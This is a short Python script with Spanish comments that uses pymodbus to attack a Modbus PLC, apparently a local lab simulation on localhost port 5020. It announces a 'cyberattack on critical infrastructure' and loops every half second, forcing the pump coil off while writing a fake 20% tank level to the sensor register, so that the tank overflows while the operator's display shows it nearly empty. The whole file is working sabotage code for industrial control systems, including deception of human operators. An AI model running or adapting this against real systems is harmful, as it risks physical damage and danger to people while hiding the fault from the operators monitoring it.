import time
from pymodbus.client import ModbusTcpClient


HOST = "localhost"
PORT = 5020
DEVICE_ID = 1            # Coincide con el contexto del servidor (PLC)
FAKE_LEVEL = 20          # Valor que verá el operador
WRITE_INTERVAL = 0.5    # Frecuencia con la que forzamos el PLC


def main():
    client = ModbusTcpClient(HOST, port=PORT)
    if not client.connect():
        raise SystemExit(f"No se pudo conectar al PLC en {HOST}:{PORT}")

    print("=== INICIANDO CIBERATAQUE A INFRAESTRUCTURA CRÍTICA ===")
    print("Objetivo: desbordar el tanque manteniendo la bomba apagada y falsificando el sensor.")
    print("Pulsa Ctrl+C para detener el ataque.\n")

    tick = 0
    try:
        while True:
            # 1) Mantener la bomba apagada
            client.write_coil(0, False, device_id=DEVICE_ID)
            # 2) Falsificar el nivel para que el HMI crea que el tanque está casi vacío
            client.write_register(0, FAKE_LEVEL, device_id=DEVICE_ID)

            tick += 1
            if tick % 10 == 0:
                print(f"[{tick:04d}] Bomba forzada a OFF | Sensor falsificado a {FAKE_LEVEL}%")

            time.sleep(WRITE_INTERVAL)
    except KeyboardInterrupt:
        print("\nAtaque detenido por el operador.")
    finally:
        client.close()


if __name__ == "__main__":
    main()
